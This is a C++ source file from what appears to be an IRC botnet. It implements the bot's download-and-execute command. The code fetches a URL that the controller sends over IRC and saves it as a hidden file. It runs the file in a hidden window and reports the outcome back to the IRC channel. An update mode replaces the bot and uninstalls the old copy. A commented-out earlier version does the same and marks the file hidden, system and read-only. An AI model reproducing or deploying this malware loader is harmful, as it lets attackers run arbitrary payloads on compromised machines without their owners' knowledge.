#include "../IRC.hpp"

int IRC::CMDDownload( string file, bool exec, bool update ) {
	if (file == "")
		return(update ? -1 : IRCSend(IRC_MSG, servers[currserver].channel, MSG_DL_FAILED_GENERIC));
	DWORD r, d, start, total;
	char buffer[512];
	char dlfrom[512];
	char dlto[MAX_PATH];
	char temp[MAX_PATH];
	api->lstrcpy(dlfrom, (LPTSTR)file.c_str());
	api->lstrcpy(dlto, (LPTSTR)api->thisfile.substr(0, api->thisfile.find_last_of("\\") + 1).c_str());
	api->lstrcpy(temp, (LPTSTR)file.substr(file.find_last_of("/") + 1, file.length() - file.find_last_of("/") + 1).c_str());
	for (int b = 0; b < api->lstrlen(temp); b++) {
		if (temp[b] == '\\' || temp[b] == '/' || temp[b] == ':' || temp[b] == '*' || temp[b] == '?' || temp[b] == '"' || temp[b] == '<' || temp[b] == '>' || temp[b] == '|')
			temp[b] = 'b';
	}
	api->lstrcat(dlto, temp);
	if (dlto[api->lstrlen(dlto) - 1] == '\n')
		dlto[api->lstrlen(dlto) - 2] = '\0';
	api->DeleteFile(dlto);
	HANDLE io = api->InternetOpenUrl(api->hIneth, dlfrom, NULL, 0, 0, 0);
	if (io != NULL) {
		HANDLE f = api->CreateFile(dlto, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
		if (f == NULL) {
			api->InternetCloseHandle(io);
			return(IRCSend(IRC_MSG, servers[currserver].channel, MSG_DL_FAILOUTPUT));
		}
		total = 0;
		start = api->GetTickCount();
		char *fileTotBuff = (char *)malloc(512000);
		do {
			ZeroMemory(buffer, sizeof(buffer));
			api->InternetReadFile(io, buffer, sizeof(buffer), &r);
			api->WriteFile(f, buffer, r, &d, NULL);
			if ((total) < 512000) {
				unsigned int bytestocopy;
				bytestocopy = 512000 - total;
				if (bytestocopy > r) 
					bytestocopy = r;
				memcpy(&fileTotBuff[total], buffer, bytestocopy);
			}
			total += r;
		}
		while (r > 0);
		//speed = total / (((api->GetTickCount() - start) / 1000) + 1);
		free(fileTotBuff);
		api->CloseHandle(f);
		api->InternetCloseHandle(io);
		//irc->pmsg(dl.target,"%s File download: %.1fKB to: %s @ %.1fKB/sec.",(dl.bdata1?update_title:download_title), total/1024.0, dlto, speed/1024.0);
		if (exec) {
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			ZeroMemory(&si, sizeof(si));
			ZeroMemory(&pi, sizeof(pi));
			si.cb = sizeof(si);
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow = SW_HIDE;
			if (!api->CreateProcess(NULL, dlto, NULL, NULL, FALSE, 0, NULL, api->directory.c_str(), &si, &pi)) {
				char error[256] = "\0";
				api->wsprintf(error, MSG_DL_FAILERR, api->GetLastError());
				return(IRCSend(IRC_MSG, servers[currserver].channel, error));
			} else {
				if (update) {
					CMDUninstall(true);
					IRCSend(IRC_MSG, servers[currserver].channel, MSG_UPDATE_SUCCESS);
					globstatus = CODE_QUIT;
					api->closesocket(ircsock);
					return CODE_QUIT;
				}
				return(update ? CODE_QUIT : IRCSend(IRC_MSG, servers[currserver].channel, MSG_DL_SUCCESSEXEC));
			}
		} else {
			return(update ? 0 : IRCSend(IRC_MSG, servers[currserver].channel, MSG_DL_SUCCESS));
		}
	} else {
		char errmsg[64] = "\0";
		api->wsprintfA(errmsg, MSG_DL_FAIL_RESOLVE, api->GetLastError());
		return(IRCSend(IRC_MSG, servers[currserver].channel, errmsg));
	}
	return 0; //unreachable
}
/*	HINTERNET hInet;
	if ((hInet = api->InternetOpen(api->GetUserAgent().c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL)) == NULL)
		return(update ? 1 : IRCSend(IRC_MSG, servers[currserver].channel, "[DOWNLOAD]: Failed to open connection."));

	HINTERNET hRet;
	for (int b = 0; b < 2; b++) {
		hRet = api->InternetOpenUrl(hInet, file.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
		if (hRet == NULL) {
			if (b) {
				return(update ? 1 : IRCSend(IRC_MSG, servers[currserver].channel, "[DOWNLOAD]: Failed to resolve URL."));
			} else {
				continue;
			}
		} else
			break;
	}
	/*int pos = file.find_last_of(".");
	string destfile = "";
	do {
		 destfile = api->directory + api->GenFileName(10) + file.substr(pos, file.length() - pos);
	} while (api->fileExists(destfile));
	if (destfile.c_str()[destfile.length() - 2] == '\r')
		destfile.erase(destfile.length() - 2, 2);*/

/*	int pos = file.find_last_of("/") + 1;
	string destfile = "";
	api->SetFileAttributesA(destfile.c_str(), FILE_ATTRIBUTE_NORMAL);
	destfile = api->directory + file.substr(pos, file.length() - pos);
	api->DeleteFile(destfile.c_str());
	HANDLE hFile = api->CreateFile(destfile.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
		return(update ? 1 : IRCSend(IRC_MSG, servers[currserver].channel, MSG_DL_FAILED_GENERIC));

	DWORD dwBytesRead = 0, dwBytesToRead = 1024, dwFileBytesRead = 0, dwTotalBytes = 0;
	char szBuffer[1025] = {0};
	do { 
		ZeroMemory(szBuffer, sizeof(szBuffer));
		if (api->InternetReadFile(hRet, (void*)szBuffer, dwBytesToRead, &dwBytesRead) == TRUE)
			api->WriteFile(hFile, szBuffer, dwBytesRead, &dwFileBytesRead, NULL);
		dwTotalBytes += dwBytesRead;
	} while(dwBytesRead > 0);
	api->CloseHandle(hFile);
	api->InternetCloseHandle(hInet);
	api->InternetCloseHandle(hRet);
	if (dwTotalBytes == 0)
		return(update ? 1 : IRCSend(IRC_MSG, servers[currserver].channel, "4"));
	if (!api->fileExists(destfile))
		return(update ? 1 : IRCSend(IRC_MSG, servers[currserver].channel, "[DOWNLOAD]: Error saving file."));
	api->SetFileAttributesA(destfile.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	if (exec) {
		api->ShellExecuteA(NULL, "open", destfile.c_str(), NULL, api->directory.c_str(), SW_HIDE);
		return(update ? 0 : IRCSend(IRC_MSG, servers[currserver].channel, MSG_DL_SUCCESSEXEC));
	} else {
		return(update ? 0 : IRCSend(IRC_MSG, servers[currserver].channel, MSG_DL_SUCCESS));
	}
	return(update ? 0 : IRCSend(IRC_MSG, servers[currserver].channel, MSG_DL_SUCCESS));
}*/

DWORD __stdcall DownloadThread	( IRC::CMD *cmd ) {
	cmd->IRCClass->CMDDownload(cmd->dlfile, cmd->exec);
	return 0;
}
